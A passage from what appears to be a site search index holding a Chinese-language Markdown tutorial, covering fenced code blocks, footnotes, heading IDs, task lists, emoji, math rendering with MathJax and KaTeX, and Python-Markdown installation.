Markdown\u57fa\u672c\u8bed\u6cd5\u5141\u8bb8\u60a8\u901a\u8fc7\u5c06\u884c\u7f29\u8fdb\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26\u6765\u521b\u5efa \u4ee3\u7801\u5757 \u3002\u5982\u679c\u53d1\u73b0\u4e0d\u65b9\u4fbf\uff0c\u8bf7\u5c1d\u8bd5\u4f7f\u7528\u53d7\u4fdd\u62a4\u7684\u4ee3\u7801\u5757\u3002\u6839\u636eMarkdown\u5904\u7406\u5668\u6216\u7f16\u8f91\u5668\u7684\u4e0d\u540c\uff0c\u60a8\u5c06\u5728\u4ee3\u7801\u5757\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u884c\u4e0a\u4f7f\u7528\u4e09\u4e2a\u53cd\u5f15\u53f7\uff08 ``` \uff09\u6216\u4e09\u4e2a\u6ce2\u6d6a\u53f7\uff08 ~~~ \uff09\u3002 ``` { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } ``` \u6548\u679c\u5982\u4e0b\uff1a { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } \u8bb8\u591aMarkdown\u5904\u7406\u5668\u90fd\u652f\u6301\u53d7\u56f4\u680f\u4ee3\u7801\u5757\u7684\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\u3002\u4f7f\u7528\u6b64\u529f\u80fd\uff0c\u60a8\u53ef\u4ee5\u4e3a\u7f16\u5199\u4ee3\u7801\u7684\u4efb\u4f55\u8bed\u8a00\u6dfb\u52a0\u989c\u8272\u7a81\u51fa\u663e\u793a\u3002\u8981\u6dfb\u52a0\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\uff0c\u8bf7\u5728\u53d7\u9632\u62a4\u7684\u4ee3\u7801\u5757\u4e4b\u524d\u7684\u53cd\u5f15\u53f7\u65c1\u8fb9\u6307\u5b9a\u4e00\u79cd\u8bed\u8a00\u3002 ```json { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } ``` \u6548\u679c\u5982\u4e0b\uff1a { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } \u652f\u6301\u4ee5\u4e0b\u8bed\u8a00\u79cd\u7c7b\uff1a bash clojure\uff0ccpp\uff0ccs\uff0ccss dart\uff0cdockerfile, diff erlang go\uff0cgradle\uff0cgroovy haskell java\uff0cjavascript\uff0cjson\uff0cjulia kotlin lisp\uff0clua makefile\uff0cmarkdown\uff0cmatlab objectivec perl\uff0cphp\uff0cpython r\uff0cruby\uff0crust scala\uff0cshell\uff0csql\uff0cswift tex\uff0ctypescript verilog\uff0cvhdl xml yaml 3.4. \u811a\u6ce8 \uf0c1 \u811a\u6ce8\u4f7f\u60a8\u53ef\u4ee5\u6dfb\u52a0\u6ce8\u91ca\u548c\u53c2\u8003\uff0c\u800c\u4e0d\u4f1a\u4f7f\u6587\u6863\u6b63\u6587\u6df7\u4e71\u3002\u5f53\u60a8\u521b\u5efa\u811a\u6ce8\u65f6\uff0c\u5e26\u6709\u811a\u6ce8\u7684\u4e0a\u6807\u6570\u5b57\u4f1a\u51fa\u73b0\u5728\u60a8\u6dfb\u52a0\u811a\u6ce8\u53c2\u8003\u7684\u4f4d\u7f6e\u3002\u8bfb\u8005\u53ef\u4ee5\u5355\u51fb\u94fe\u63a5\u4ee5\u8df3\u81f3\u9875\u9762\u5e95\u90e8\u7684\u811a\u6ce8\u5185\u5bb9\u3002 \u8981\u521b\u5efa\u811a\u6ce8\u53c2\u8003\uff0c\u8bf7\u5728\u65b9\u62ec\u53f7\uff08 [^1] \uff09\u5185\u6dfb\u52a0\u63d2\u5165\u7b26\u53f7\u548c\u6807\u8bc6\u7b26\u3002\u6807\u8bc6\u7b26\u53ef\u4ee5\u662f\u6570\u5b57\u6216\u5355\u8bcd\uff0c\u4f46\u4e0d\u80fd\u5305\u542b\u7a7a\u683c\u6216\u5236\u8868\u7b26\u3002\u6807\u8bc6\u7b26\u4ec5\u5c06\u811a\u6ce8\u53c2\u8003\u4e0e\u811a\u6ce8\u672c\u8eab\u76f8\u5173\u8054-\u5728\u8f93\u51fa\u4e2d\uff0c\u811a\u6ce8\u6309\u987a\u5e8f\u7f16\u53f7\u3002 \u5728\u62ec\u53f7\u5185\u4f7f\u7528\u53e6\u4e00\u4e2a\u63d2\u5165\u7b26\u53f7\u548c\u6570\u5b57\u6dfb\u52a0\u811a\u6ce8\uff0c\u5e76\u7528\u5192\u53f7\u548c\u6587\u672c\uff08 [^1]: My footnote. \uff09\u3002\u60a8\u4e0d\u5fc5\u5728\u6587\u6863\u672b\u5c3e\u6dfb\u52a0\u811a\u6ce8\u3002\u60a8\u53ef\u4ee5\u5c06\u5b83\u4eec\u653e\u5728\u9664\u5217\u8868\uff0c\u5757\u5f15\u53f7\u548c\u8868\u4e4b\u7c7b\u7684\u5176\u4ed6\u5143\u7d20\u4e4b\u5916\u7684\u4efb\u4f55\u4f4d\u7f6e\u3002 Here's a simple footnote,[^1] and here's a longer one.[^bignote] [^1]: This is the first footnote. [^bignote]: Here's one with multiple paragraphs and code. Indent paragraphs to include them in the footnote. `{ my code }` Add as many paragraphs as you like. \u6548\u679c\u5982\u4e0b\uff1a Here's a simple footnote, 1 and here's a longer one. 2 3.5. \u6807\u9898\u7f16\u53f7 \uf0c1 \u8bb8\u591aMarkdown\u5904\u7406\u5668\u652f\u6301 \u6807\u9898 \u7684\u81ea\u5b9a\u4e49ID - \u4e00\u4e9bMarkdown\u5904\u7406\u5668\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5b83\u4eec\u3002\u6dfb\u52a0\u81ea\u5b9a\u4e49ID\u5141\u8bb8\u60a8\u76f4\u63a5\u94fe\u63a5\u5230\u6807\u9898\u5e76\u4f7f\u7528CSS\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u3002\u8981\u6dfb\u52a0\u81ea\u5b9a\u4e49\u6807\u9898ID\uff0c\u8bf7\u5728\u4e0e\u6807\u9898\u76f8\u540c\u7684\u884c\u4e0a\u7528\u5927\u62ec\u53f7\u62ec\u8d77\u8be5\u81ea\u5b9a\u4e49ID\u3002 ### My Great Heading {#custom-id} HTML\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a <h3 id=\"custom-id\">My Great Heading</h3> \u901a\u8fc7\u521b\u5efa\u5e26\u6709\u6570\u5b57\u7b26\u53f7\uff08 # \uff09\u548c\u81ea\u5b9a\u4e49\u6807\u9898ID\u7684 \u6807\u51c6\u94fe\u63a5 \uff0c\u53ef\u4ee5\u94fe\u63a5\u5230\u6587\u4ef6\u4e2d\u5177\u6709\u81ea\u5b9a\u4e49ID\u7684\u6807\u9898\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c [Heading IDs](#heading-ids) <a href=\"#heading-ids\">Heading IDs</a> Heading IDs \u5176\u4ed6\u7f51\u7ad9\u53ef\u4ee5\u901a\u8fc7\u5c06\u81ea\u5b9a\u4e49\u6807\u9898ID\u6dfb\u52a0\u5230\u7f51\u9875\u7684\u5b8c\u6574URL\uff08\u4f8b\u5982 [Heading IDs](https://jerry-se.github.io/markdown/#heading-ids) \uff09\u6765\u94fe\u63a5\u5230\u6807\u9898\u3002 3.6. \u5b9a\u4e49\u5217\u8868 \uf0c1 \u4e00\u4e9bMarkdown\u5904\u7406\u5668\u5141\u8bb8\u60a8\u521b\u5efa\u672f\u8bed\u53ca\u5176\u5bf9\u5e94\u5b9a\u4e49\u7684\u5b9a\u4e49\u5217\u8868\u3002\u8981\u521b\u5efa\u5b9a\u4e49\u5217\u8868\uff0c\u8bf7\u5728\u7b2c\u4e00\u884c\u4e0a\u952e\u5165\u672f\u8bed\u3002\u5728\u4e0b\u4e00\u884c\uff0c\u952e\u5165\u4e00\u4e2a\u5192\u53f7\uff0c\u540e\u8ddf\u4e00\u4e2a\u7a7a\u683c\u548c\u5b9a\u4e49\u3002 First Term : This is the definition of the first term. Second Term : This is one definition of the second term. : This is another definition of the second term. HTML\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a <dl> <dt>First Term</dt> <dd>This is the definition of the first term.</dd> <dt>Second Term</dt> <dd>This is one definition of the second term. </dd> <dd>This is another definition of the second term.</dd> </dl> \u6548\u679c\u5982\u4e0b\uff1a First Term This is the definition of the first term. Second Term This is one definition of the second term. This is another definition of the second term. 3.7. \u5220\u9664\u7ebf \uf0c1 \u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u5355\u8bcd\u4e2d\u5fc3\u653e\u7f6e\u4e00\u6761\u6c34\u5e73\u7ebf\u6765\u5220\u9664\u5355\u8bcd\u3002\u7ed3\u679c\u770b\u8d77\u6765 \u50cf\u8fd9\u6837 \u3002\u6b64\u529f\u80fd\u4f7f\u60a8\u53ef\u4ee5\u6307\u793a\u67d0\u4e9b\u5355\u8bcd\u662f\u4e00\u4e2a\u9519\u8bef\uff0c\u8981\u4ece\u6587\u6863\u4e2d\u5220\u9664\u3002\u82e5\u8981\u5220\u9664\u5355\u8bcd\uff0c\u8bf7\u5728\u5355\u8bcd\u524d\u540e\u4f7f\u7528\u4e24\u4e2a\u6ce2\u6d6a\u53f7 ~~ \u3002 ~~\u8fd9\u91cc\u662f\u5220\u9664\u7ebf~~ 3.8. \u4efb\u52a1\u5217\u8868 \uf0c1 \u4efb\u52a1\u5217\u8868\u4f7f\u60a8\u53ef\u4ee5\u521b\u5efa\u5e26\u6709\u590d\u9009\u6846\u7684\u9879\u76ee\u5217\u8868\u3002\u5728\u652f\u6301\u4efb\u52a1\u5217\u8868\u7684Markdown\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u590d\u9009\u6846\u5c06\u663e\u793a\u5728\u5185\u5bb9\u65c1\u8fb9\u3002\u8981\u521b\u5efa\u4efb\u52a1\u5217\u8868\uff0c\u8bf7\u5728\u4efb\u52a1\u5217\u8868\u9879\u4e4b\u524d\u6dfb\u52a0\u7834\u6298\u53f7 - \u548c\u65b9\u62ec\u53f7 [ ] \uff0c\u5e76\u5728 [ ] \u524d\u9762\u52a0\u4e0a\u7a7a\u683c\u3002\u8981\u9009\u62e9\u4e00\u4e2a\u590d\u9009\u6846\uff0c\u8bf7\u5728\u65b9\u62ec\u53f7 [x] \u4e4b\u95f4\u6dfb\u52a0 x \u3002 - [x] Write the press release - [ ] Update the website - [ ] Contact the media \u6548\u679c\u5982\u4e0b\uff1a [x] Write the press release [ ] Update the website [ ] Contact the media 3.9. Emoji\u8868\u60c5 \uf0c1 \u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5c06\u8868\u60c5\u7b26\u53f7\u6dfb\u52a0\u5230Markdown\u6587\u4ef6\u4e2d\uff1a\u5c06\u8868\u60c5\u7b26\u53f7\u590d\u5236\u5e76\u7c98\u8d34\u5230Markdown\u683c\u5f0f\u7684\u6587\u672c\u4e2d\uff0c\u6216\u8005\u952e\u5165 emoji shortcodes \u3002 \u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u4ee5\u7b80\u5355\u5730\u4ece Emojipedia \u7b49\u6765\u6e90\u590d\u5236\u8868\u60c5\u7b26\u53f7\u5e76\u5c06\u5176\u7c98\u8d34\u5230\u6587\u6863\u4e2d\u3002\u8bb8\u591aMarkdown\u5e94\u7528\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u4ee5Markdown\u683c\u5f0f\u7684\u6587\u672c\u663e\u793a\u8868\u60c5\u7b26\u53f7\u3002\u4eceMarkdown\u5e94\u7528\u7a0b\u5e8f\u5bfc\u51fa\u7684HTML\u548cPDF\u6587\u4ef6\u5e94\u663e\u793a\u8868\u60c5\u7b26\u53f7\u3002 Tips : \u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u9759\u6001\u7f51\u7ad9\u751f\u6210\u5668\uff0c\u8bf7\u786e\u4fdd\u5c06HTML\u9875\u9762\u7f16\u7801\u4e3aUTF-8\u3002 \u4e00\u4e9bMarkdown\u5e94\u7528\u7a0b\u5e8f\u5141\u8bb8\u60a8\u901a\u8fc7\u952e\u5165\u8868\u60c5\u7b26\u53f7\u77ed\u4ee3\u7801\u6765\u63d2\u5165\u8868\u60c5\u7b26\u53f7\u3002\u8fd9\u4e9b\u4ee5\u5192\u53f7\u5f00\u5934\u548c\u7ed3\u5c3e\uff0c\u5e76\u5305\u542b\u8868\u60c5\u7b26\u53f7\u7684\u540d\u79f0\u3002 \u53bb\u9732\u8425\u4e86\uff01 :tent: \u5f88\u5feb\u56de\u6765\u3002 \u771f\u597d\u7b11\uff01 :joy: \u6548\u679c\u5982\u4e0b\uff1a \u53bb\u9732\u8425\u4e86\uff01\u26fa\u5f88\u5feb\u56de\u6765\u3002 \u771f\u597d\u7b11\uff01\ud83d\ude02 Tips : \u60a8\u53ef\u4ee5\u4f7f\u7528\u6b64 \u8868\u60c5\u7b26\u53f7\u7b80\u7801\u5217\u8868 \uff0c\u4f46\u8bf7\u8bb0\u4f4f\uff0c\u8868\u60c5\u7b26\u53f7\u7b80\u7801\u56e0\u5e94\u7528\u7a0b\u5e8f\u800c\u5f02\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Markdown\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u6863\u3002 3.10. \u6570\u5b66\u516c\u5f0f \uf0c1 LaTeX\u662f\u4e00\u79cd\u57fa\u4e8e\u03a4\u0395\u03a7\u7684\u6392\u7248\u7cfb\u7edf\uff0c\u7531\u7f8e\u56fd\u8ba1\u7b97\u673a\u5b66\u5bb6\u83b1\u65af\u5229\u00b7\u5170\u4f2f\u7279\uff08Leslie Lamport\uff09\u572820\u4e16\u7eaa80\u5e74\u4ee3\u521d\u671f\u5f00\u53d1\uff0c\u5229\u7528\u8fd9\u79cd\u683c\u5f0f\uff0c\u5373\u4f7f\u4f7f\u7528\u8005\u6ca1\u6709\u6392\u7248\u548c\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u77e5\u8bc6\u4e5f\u53ef\u4ee5\u5145\u5206\u53d1\u6325\u7531TeX\u6240\u63d0\u4f9b\u7684\u5f3a\u5927\u529f\u80fd\uff0c\u80fd\u5728\u51e0\u5929\uff0c\u751a\u81f3\u51e0\u5c0f\u65f6\u5185\u751f\u6210\u5f88\u591a\u5177\u6709\u4e66\u7c4d\u8d28\u91cf\u7684\u5370\u5237\u54c1\u3002\u5bf9\u4e8e\u751f\u6210\u590d\u6742\u8868\u683c\u548c\u6570\u5b66\u516c\u5f0f\uff0c\u8fd9\u4e00\u70b9\u8868\u73b0\u5f97\u5c24\u4e3a\u7a81\u51fa\u3002\u56e0\u6b64\u5b83\u975e\u5e38\u9002\u7528\u4e8e\u751f\u6210\u9ad8\u5370\u5237\u8d28\u91cf\u7684\u79d1\u6280\u548c\u6570\u5b66\u7c7b\u6587\u6863\u3002 MathJax\u662f\u4e00\u4e2a\u663e\u793a\u7f51\u7edc\u4e0a\u6570\u5b66\u516c\u5f0f\u7684\u5f00\u6e90JavaScript\u5f15\u64ce\u5e93\uff0c\u5b83\u53ef\u4ee5\u5728\u6240\u6709\u6d4f\u89c8\u5668\u4e0a\u9762\u5de5\u4f5c\uff0c\u5176\u4e2d\u5c31\u652f\u6301LaTeX\uff0cMathML\u548cAsciiMath \u7b26\u53f7\uff0c\u91cc\u9762\u7684\u6570\u5b57\u4f1a\u88abMathJax\u4f7f\u7528JavaScript\u5f15\u64ce\u89e3\u6790\u6210HTML\uff0cSVG\u6216\u8005\u662fMathML \u65b9\u7a0b\u5f0f\uff0c\u7136\u540e\u5728\u73b0\u4ee3\u7684\u6d4f\u89c8\u5668\u91cc\u9762\u663e\u793a\u3002 \u5b83\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u5229\u7528\u6700\u65b0\u7684web\u6280\u672f\uff0c\u6784\u5efa\u4e00\u4e2a\u652f\u6301math\u7684web\u5e73\u53f0\u3002\u652f\u6301\u4e3b\u8981\u7684\u6d4f\u89c8\u5668\u548c\u64cd\u4f5c\u7cfb\u7edf,\u5305\u62ec\u90a3\u4e9b\u79fb\u52a8\u8bbe\u5907\u3002 KaTeX \uff1a \u53ef\u6c57\u5b66\u9662\u51fa\u54c1\uff0c\u53f7\u79f0\u201c\u6700\u5feb\u201d\u7684\u6570\u5b66\u516c\u5f0f\u6e32\u67d3\u5e93\u3002\u652f\u6301\u4e3b\u6d41\u7684\u6d4f\u89c8\u5668\uff1aChrome, Firefox, Safari, Opera\u548c IE8-IE11\u3002\u6709\u4ee5\u4e0b\u4f18\u70b9\uff1a \u5feb\u901f\uff1a\u5e76\u53d1\u6e32\u67d3\uff0c\u65e0\u9700\u91cd\u6392\u9875\u9762\u3002\u6839\u636e\u8fd9\u4e2a\u6d4b\u8bd5\uff0c\u6027\u80fd\u7edd\u5bf9\u79d2\u6740MathJax\uff1b \u6e32\u67d3\u6548\u679c\u597d\uff1a\u91c7\u7528TeX\u8bed\u6cd5\uff0c\u6e32\u67d3\u6548\u679c\u8fbe\u5230\u5370\u5237\u51fa\u7248\u7ea7\u522b\uff1b \u65e0\u4f9d\u8d56\uff1a\u4e0d\u4f9d\u8d56\u5176\u5b83\u5e93\uff1b \u652f\u6301\u670d\u52a1\u5668\u7aef\u6e32\u67d3\uff1a\u4f8b\u5982\uff0c\u670d\u52a1\u5668\u7aef\u7684Node.js\u7a0b\u5e8f\u8c03\u7528KaTeX\uff0c\u628a\u6e32\u67d3\u597d\u7684HTML\u7247\u6bb5\u76f4\u63a5\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002 VS Code\u7684 Markdown preview enhanced\uff08MPE\uff09\u63d2\u4ef6\u652f\u6301 MathJax \u548c KaTeX \u4e24\u7c7b\u6e32\u67d3\u5f15\u64ce\u3002\u603b\u7ed3\u6765\u8bf4\uff0c\u4e24\u8005\u7684\u7279\u70b9\u5982\u4e0b\uff1a MathJax \u6e32\u67d3\u66f4\u5feb\uff0c\u652f\u6301\u82e5\u5e72\u7b80\u5199\u5b57\u7b26\uff0c\u4f46\u662f\u672c\u8eab\u652f\u6301\u7684\u8303\u56f4\u8f83\u5c0f\uff1b KaTeX \u6e32\u67d3\u7a0d\u6162\uff0c\u652f\u6301\u66f4\u591a\u590d\u6742\u7684\u8868\u793a \u53e6\u5916\uff0c Typora \u7528\u7684\u4e5f\u662f MathJax \u5f15\u64ce\uff0c\u5374\u80fd\u5b9e\u73b0\u66f4\u591a\u7684\u529f\u80fd\uff0c\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u7248\u672c\u95ee\u9898\u3002 \u53c2\u8003\u8d44\u6599\uff1a Online LaTeX Equation Editor - create, integrate and download Tex \u79d1\u5b66\u516c\u5f0f\u8bed\u8a00 (TeX/LaTeX) \u4e00\u4efd\u4e0d\u592a\u7b80\u77ed\u7684 LATEX 2\u03b5 \u4ecb\u7ecd LaTeX\u5982\u4f55\u6e32\u67d3\uff1f \u884c\u5185 MathJax \u516c\u5f0f\u4f7f\u7528\u65b9\u6cd5\uff0c\u6bd4\u5982\u8fd9\u4e2a\u5316\u5b66\u516c\u5f0f\uff1a $\\ce{Hg^2+ ->[I-] HgI2 ->[I-] [Hg^{II}I4]^2-}$ MathJax \u5757\u516c\u5f0f\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a $$H(D_2) = -\\left(\\frac{2}{4}\\log_2 \\frac{2}{4} + \\frac{2}{4}\\log_2 \\frac{2}{4}\\right) = 1$$ \u77e9\u9635\uff1a $$ \\begin{pmatrix} 1 & a_1 & a_1^2 & \\cdots & a_1^n \\\\ 1 & a_2 & a_2^2 & \\cdots & a_2^n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 1 & a_m & a_m^2 & \\cdots & a_m^n \\\\ \\end{pmatrix} $$ This is an extension for Python Markdown which adds KaTeX support. ```math f(x) = \\int_{-\\infty}^\\infty \\hat f(\\xi)\\,e^{2 \\pi i \\xi x} \\,d\\xi ``` \u5f88\u591a\u5e73\u53f0\uff0c\u6bd4\u5982\u77e5\u4e4e\u3001CSDN\u652f\u6301\u516c\u5f0f\uff0c\u5bf9\u4e8e\u5fae\u4fe1\u4e0d\u652f\u6301\u8fd9\u79cd\u4e0d\u652f\u6301\u7684\uff0c\u76ee\u524d\u7684\u89e3\u51b3\u65b9\u6848\u662f\u8f6c\u6210 svg \u56fe\u7247\u653e\u5230\u5fae\u4fe1\u4e2d\uff0c\u65e0\u9700\u8c03\u6574\uff0c\u77e2\u91cf\u4e0d\u5931\u771f\u3002 4. Python-Markdown \uf0c1 4.1. \u4ecb\u7ecd \uf0c1 \u8fd9\u662f John Gruber \u7684 Markdown \u7684 Python \u5b9e\u73b0\u3002\u5c3d\u7ba1\u5b58\u5728\u4e00\u4e9b\u5df2\u77e5\u95ee\u9898\uff0c\u4f46\u5b83\u51e0\u4e4e\u5b8c\u5168\u7b26\u5408\u53c2\u8003\u5b9e\u73b0\u3002 \u6709\u5173\u786e\u5207\u652f\u6301\u548c\u4e0d\u652f\u6301\u7684\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u529f\u80fd \u3002 \u53ef\u7528\u6269\u5c55 \u652f\u6301\u9644\u52a0\u529f\u80fd\u3002 4.2. \u6587\u6863 \uf0c1 pip install markdown import markdown html = markdown.markdown(your_text_string) \u6709\u5173\u66f4\u9ad8\u7ea7\u7684 \u5b89\u88c5 \u548c \u4f7f\u7528 \u6587\u6863\uff0c \u8bf7\u53c2\u9605 docs/ \u53d1\u884c\u7248\u76ee\u5f55\u6216\u9879\u76ee\u7f51\u7ad9 https://Python-Markdown.github.io/ \u3002 Third Party Extensions 5. \u53c2\u8003\u8d44\u6599 \uf0c1 Markdown \u5b98\u65b9\u6559\u7a0b This is the first footnote. \u21a9 Here's one with multiple paragraphs and code. Indent paragraphs to include them in the footnote. { my code } Add as many paragraphs as you like. \u21a9","title":"Markdown"},{"location":"markdown/#markdown","text":"\u672c\u4eba\u5173\u4e8e\u4f7f\u7528Markdown\u7684\u603b\u7ed3\u3002","title":"Markdown \u6559\u7a0b"},{"location":"markdown/#introduction","text":"Markdown \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\uff0c\u5141\u8bb8\u4eba\u4eec\u4f7f\u7528\u6613\u8bfb\u6613\u5199\u7684\u7eaf\u6587\u672c\u683c\u5f0f\u7f16\u5199\u6587\u6863\u3002 \u5728 2004 \u7531\u7ea6\u7ff0\u00b7\u683c\u9c81\u4f2f\uff08\u82f1\u8bed\uff1aJohn Gruber\uff09\u521b\u5efa\u3002 \u53ef\u4e0eHTML\u6df7\u7f16\uff0c\u53ef\u5bfc\u51fa HTML\u3001PDF \u4ee5\u53ca\u672c\u8eab\u7684 .md \u683c\u5f0f\u7684\u6587\u4ef6\u3002 \u56e0\u7b80\u6d01\u3001\u9ad8\u6548\u3001\u6613\u8bfb\u3001\u6613\u5199\uff0cMarkdown\u88ab\u5927\u91cf\u4f7f\u7528\uff0c\u5982Github\u3001Wikipedia\u3001\u7b80\u4e66\u7b49\u3002 \u6709\u5173\u8bed\u6cd5\u89c4\u5219\uff0c\u8bf7\u53c2\u9605 John \u7684 \u8bed\u6cd5\u6587\u6863 \u3002","title":"1. \u7b80\u4ecb"},{"location":"markdown/#basic-syntax","text":"","title":"2. \u57fa\u672c\u8bed\u6cd5"},{"location":"markdown/#headers","text":"\u8981\u521b\u5efa\u6807\u9898\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u524d\u9762\u6dfb\u52a0\u4e95\u53f7 ( # ) \u3002 # \u7684\u6570\u91cf\u4ee3\u8868\u4e86\u6807\u9898\u7684\u7ea7\u522b\u3002\u4f8b\u5982\uff0c\u6dfb\u52a0\u4e09\u4e2a # \u8868\u793a\u521b\u5efa\u4e00\u4e2a\u4e09\u7ea7\u6807\u9898 ( <h3> ) (\u4f8b\u5982\uff1a ### My Header )\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c # Heading level 1 <h1>Heading level 1</h1>","title":"2.1. \u6807\u9898"},{"location":"markdown/#paragraphs-and-line-breaks","text":"","title":"2.2. \u6bb5\u843d\u548c\u6362\u884c"},{"location":"markdown/#paragraphs","text":"\u8981\u521b\u5efa\u6bb5\u843d\uff0c\u8bf7\u4f7f\u7528\u7a7a\u767d\u884c\u5c06\u4e00\u884c\u6216\u591a\u884c\u6587\u672c\u8fdb\u884c\u5206\u9694\u3002 \u4e0d\u8981\u7528\u7a7a\u683c\uff08spaces\uff09\u6216\u5236\u8868\u7b26\uff08 tabs\uff09\u7f29\u8fdb\u6bb5\u843d\u3002","title":"2.2.1. \u6bb5\u843d"},{"location":"markdown/#line-breaks","text":"\u5728\u4e00\u884c\u7684\u672b\u5c3e\u6dfb\u52a0\u4e24\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\uff0c\u7136\u540e\u6309\u56de\u8f66\u952e,\u5373\u53ef\u521b\u5efa\u4e00\u4e2a\u6362\u884c( <br> )\u3002 \u51e0\u4e4e\u6bcf\u4e2a Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u4e24\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\u8fdb\u884c\u6362\u884c\uff0c\u79f0\u4e3a \u7ed3\u5c3e\u7a7a\u683c\uff08trailing whitespace) \u7684\u65b9\u5f0f\uff0c\u4f46\u8fd9\u662f\u6709\u4e89\u8bae\u7684\uff0c\u56e0\u4e3a\u5f88\u96be\u5728\u7f16\u8f91\u5668\u4e2d\u76f4\u63a5\u770b\u5230\u7a7a\u683c\uff0c\u5e76\u4e14\u5f88\u591a\u4eba\u5728\u6bcf\u4e2a\u53e5\u5b50\u540e\u9762\u90fd\u4f1a\u6709\u610f\u6216\u65e0\u610f\u5730\u6dfb\u52a0\u4e24\u4e2a\u7a7a\u683c\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4f60\u53ef\u80fd\u8981\u4f7f\u7528\u9664\u7ed3\u5c3e\u7a7a\u683c\u4ee5\u5916\u7684\u5176\u5b83\u65b9\u5f0f\u6765\u6362\u884c\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u51e0\u4e4e\u6bcf\u4e2a Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u53e6\u4e00\u79cd\u6362\u884c\u65b9\u5f0f\uff1aHTML \u7684 <br> \u6807\u7b7e\u3002 \u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u8bf7\u5728\u884c\u5c3e\u6dfb\u52a0\u201c\u7ed3\u5c3e\u7a7a\u683c\u201d\u6216 HTML \u7684 <br> \u6807\u7b7e\u6765\u5b9e\u73b0\u6362\u884c\u3002","title":"2.2.2. \u6362\u884c"},{"location":"markdown/#text-emphasis","text":"\u901a\u8fc7\u5c06\u6587\u672c\u8bbe\u7f6e\u4e3a\u7c97\u4f53\u6216\u659c\u4f53\u6765\u5f3a\u8c03\u5176\u91cd\u8981\u6027\u3002","title":"2.3. \u5b57\u4f53"},{"location":"markdown/#bold","text":"\u8981\u52a0\u7c97\u6587\u672c\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u524d\u540e\u5404\u6dfb\u52a0\u4e24\u4e2a\u661f\u53f7\uff08asterisks\uff09\u6216\u4e0b\u5212\u7ebf\uff08underscores\uff09\u3002\u5982\u9700\u52a0\u7c97\u4e00\u4e2a\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u4e2d\u95f4\u90e8\u5206\u7528\u4ee5\u8868\u793a\u5f3a\u8c03\u7684\u8bdd\uff0c\u8bf7\u5728\u8981\u52a0\u7c97\u90e8\u5206\u7684\u4e24\u4fa7\u5404\u6dfb\u52a0\u4e24\u4e2a\u661f\u53f7\uff08asterisks\uff09\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c I just love **bold text**. I just love <strong>bold text</strong>. I just love bold text . I just love __bold text__. I just love <strong>bold text</strong>. I just love bold text . Love**is**bold Love<strong>is</strong>bold Love is bold Markdown \u5e94\u7528\u7a0b\u5e8f\u5728\u5982\u4f55\u5904\u7406\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u7684\u4e0b\u5212\u7ebf\u4e0a\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u517c\u5bb9\u8003\u8651\uff0c\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u90e8\u5206\u52a0\u7c97\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528\u661f\u53f7\uff08asterisks\uff09\u3002 \u2705 Do this \u274c Don't do this Love**is**bold Love__is__bold","title":"2.3.1. \u7c97\u4f53"},{"location":"markdown/#italic","text":"\u8981\u7528\u659c\u4f53\u663e\u793a\u6587\u672c\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u524d\u540e\u6dfb\u52a0\u4e00\u4e2a\u661f\u53f7\uff08asterisk\uff09\u6216\u4e0b\u5212\u7ebf\uff08underscore\uff09\u3002\u8981\u659c\u4f53\u7a81\u51fa\u5355\u8bcd\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u8bf7\u5728\u5b57\u6bcd\u524d\u540e\u5404\u6dfb\u52a0\u4e00\u4e2a\u661f\u53f7\uff0c\u4e2d\u95f4\u4e0d\u8981\u5e26\u7a7a\u683c\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c Italicized text is the *cat's meow*. Italicized text is the <em>cat's meow</em>. Italicized text is the cat's meow . Italicized text is the _cat's meow_. Italicized text is the <em>cat's meow</em>. Italicized text 